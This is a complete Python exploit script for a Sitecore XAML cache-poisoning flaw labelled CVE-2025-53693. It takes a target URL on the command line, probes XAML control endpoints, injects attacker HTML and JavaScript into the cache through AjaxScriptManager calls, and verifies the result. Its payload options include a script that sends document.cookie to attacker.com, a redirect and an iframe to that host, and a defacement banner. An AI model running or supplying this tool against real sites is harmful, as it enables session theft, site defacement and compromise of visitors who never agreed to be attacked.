#!/usr/bin/env python3

import requests
import json
import sys
import argparse
import urllib3
from urllib.parse import urljoin, quote
import base64
import hashlib
import time
import random
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SitecoreCachePoisoning:
    def __init__(self, target_url, timeout=15, verify_ssl=False):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
        self.xaml_controls = [
            'Sitecore.Shell.Applications.Dialogs.ItemLister.ItemLister',
            'Sitecore.Shell.Applications.ContentEditor.ContentEditor',
            'Sitecore.Shell.Applications.WebEdit.WebEdit',
            'Sitecore.Shell.Applications.Dialogs.SelectItem.SelectItemDialog',
            'Sitecore.Shell.Applications.Media.MediaBrowser'
        ]

    def generate_cache_key(self, base_key=None):
        if not base_key:
            base_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return f"sitecore_cache_{base_key}_{int(time.time())}"

    def create_malicious_payload(self, payload_type='xss'):
        payloads = {
            'xss': '<script>alert("CVE-2025-53693 Cache Poisoning")</script>',
            'iframe': '<iframe src="//attacker.com/payload" width="100%" height="400"></iframe>',
            'redirect': '<script>window.location="//attacker.com/pwned"</script>',
            'data_exfil': '<script>fetch("//attacker.com/exfil?data="+btoa(document.cookie))</script>',
            'persistent': '''<div id="pwned" style="position:fixed;top:0;left:0;width:100%;background:red;color:white;z-index:9999;padding:10px;">
                            <h2>PWNED via CVE-2025-53693</h2>
                            <p>Cache poisoned</p>
                            </div>'''
        }
        return payloads.get(payload_type, payloads['xss'])

    def check_xaml_access(self, control_path):
        xaml_endpoint = f"/-/xaml/{control_path}"
        url = urljoin(self.target_url, xaml_endpoint)
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            
            if response.status_code == 200:
                content = response.text.lower()
                if any(indicator in content for indicator in ['sitecore', 'xaml', 'ajaxscriptmanager', 'viewstate']):
                    return True, response
            elif response.status_code == 500:
                if 'sitecore' in response.text.lower():
                    return True, response
                    
        except requests.RequestException:
            pass
            
        return False, None

    def build_ajax_payload(self, method_name, parameters):
        ajax_params = {
            'method': method_name,
            'parameters': parameters
        }
        return json.dumps(ajax_params, separators=(',', ':'))

    def poison_cache(self, control_path, cache_key, malicious_content):
        xaml_endpoint = f"/-/xaml/{control_path}"
        url = urljoin(self.target_url, xaml_endpoint)
        
        ajax_payload = self.build_ajax_payload('AddToCache', [cache_key, malicious_content])
        
        data = {
            '__SOURCE': control_path.split('.')[-1],
            '__PARAMETERS': ajax_payload
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': url,
            'Origin': self.target_url
        }
        
        try:
            response = self.session.post(
                url, 
                data=data, 
                headers=headers, 
                timeout=self.timeout, 
                verify=self.verify_ssl
            )
            
            return response.status_code, response.text, response.headers
            
        except requests.RequestException as e:
            return None, str(e), {}

    def verify_cache_poisoning(self, cache_key):
        cache_endpoints = [
            f'/sitecore/shell/default.aspx?cache={cache_key}',
            f'/sitecore/admin/cache.aspx?key={cache_key}',
            f'/-/speak/v1/cache/{cache_key}',
            f'/api/sitecore/cache/{cache_key}'
        ]
        
        for endpoint in cache_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
                if response.status_code == 200 and len(response.text) > 0:
                    return True, endpoint, response.text
            except requests.RequestException:
                continue
                
        return False, None, None

    def exploit_reflection_method(self, control_path, method_name, method_params):
        xaml_endpoint = f"/-/xaml/{control_path}"
        url = urljoin(self.target_url, xaml_endpoint)
        
        ajax_payload = self.build_ajax_payload(method_name, method_params)
        
        data = {
            '__SOURCE': control_path.split('.')[-1],
            '__PARAMETERS': ajax_payload
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': url,
            'Origin': self.target_url
        }
        
        try:
            response = self.session.post(
                url, 
                data=data, 
                headers=headers, 
                timeout=self.timeout, 
                verify=self.verify_ssl
            )
            
            return {
                'status_code': response.status_code,
                'response_text': response.text,
                'headers': dict(response.headers),
                'success': response.status_code in [200, 500]
            }
            
        except requests.RequestException as e:
            return {
                'status_code': None,
                'response_text': str(e),
                'headers': {},
                'success': False
            }

    def exploit(self, payload_type='persistent'):
        print(f"[*] Testing CVE-2025-53693 against: {self.target_url}")
        print("[*] Sitecore XAML Cache Poisoning via AjaxScriptManager")
        
        accessible_controls = []
        
        print("\n[*] Testing XAML control accessibility...")
        for control in self.xaml_controls:
            print(f"[*] Testing: {control}")
            accessible, response = self.check_xaml_access(control)
            if accessible:
                print(f"[+] Accessible: {control}")
                accessible_controls.append(control)
            else:
                print(f"[-] Not accessible: {control}")
                
        if not accessible_controls:
            print("[-] No accessible XAML controls found")
            return False
            
        target_control = accessible_controls[0]
        print(f"\n[+] Using control: {target_control}")
        
        cache_key = self.generate_cache_key()
        malicious_payload = self.create_malicious_payload(payload_type)
        
        print(f"[*] Generated cache key: {cache_key}")
        print(f"[*] Payload type: {payload_type}")
        print(f"[*] Payload preview: {malicious_payload[:100]}...")
        
        print("\n[*] Attempting cache poisoning...")
        status_code, response_text, headers = self.poison_cache(
            target_control, 
            cache_key, 
            malicious_payload
        )
        
        if status_code is None:
            print(f"[-] Request failed: {response_text}")
            return False
            
        print(f"[*] Response status: {status_code}")
        
        if status_code in [200, 500]:
            print("[+] Cache poisoning request sent successfully!")
            
            print("\n[*] Verifying cache poisoning...")
            time.sleep(2)
            
            poisoned, endpoint, cached_content = self.verify_cache_poisoning(cache_key)
            
            if poisoned:
                print(f"[+] CACHE POISONING SUCCESSFUL!")
                print(f"[+] Poisoned cache accessible at: {endpoint}")
                print(f"[+] Cached content length: {len(cached_content)} characters")
                
                if malicious_payload[:50] in cached_content:
                    print("[+] Malicious payload confirmed in cache!")
                    
                return {
                    'vulnerable': True,
                    'control_used': target_control,
                    'cache_key': cache_key,
                    'payload_type': payload_type,
                    'verification_endpoint': endpoint,
                    'cached_content': cached_content,
                    'response_status': status_code
                }
            else:
                print("[-] Cache poisoning could not be verified")
                
                print("\n[*] Testing alternative reflection methods...")
                test_methods = [
                    ('GetCacheKey', [cache_key]),
                    ('ProcessRequest', [malicious_payload]),
                    ('HandleAjaxRequest', [cache_key, malicious_payload])
                ]
                
                for method_name, params in test_methods:
                    print(f"[*] Testing method: {method_name}")
                    result = self.exploit_reflection_method(target_control, method_name, params)
                    
                    if result['success']:
                        print(f"[+] Method {method_name} executed successfully!")
                        if 'error' not in result['response_text'].lower():
                            return {
                                'vulnerable': True,
                                'control_used': target_control,
                                'method_used': method_name,
                                'response': result,
                                'cache_key': cache_key
                            }
        else:
            print(f"[-] Unexpected response status: {status_code}")
            
        return False

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-53693 Sitecore Cache Poisoning Exploit')
    parser.add_argument('target', help='Target Sitecore URL (e.g., https://target.com)')
    parser.add_argument('--payload-type', choices=['xss', 'iframe', 'redirect', 'data_exfil', 'persistent'], 
                       default='persistent', help='Type of malicious payload (default: persistent)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    parser.add_argument('--output', help='Output file for results (JSON format)')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
        
    exploit = SitecoreCachePoisoning(
        target_url=args.target,
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify
    )
    
    try:
        result = exploit.exploit(args.payload_type)
        
        if args.output and result:
            with open(args.output, 'w') as f:
                json.dump(result, f, indent=2, default=str)
            print(f"\n[+] Results saved to: {args.output}")
            
        return 0 if result else 1
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 1
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
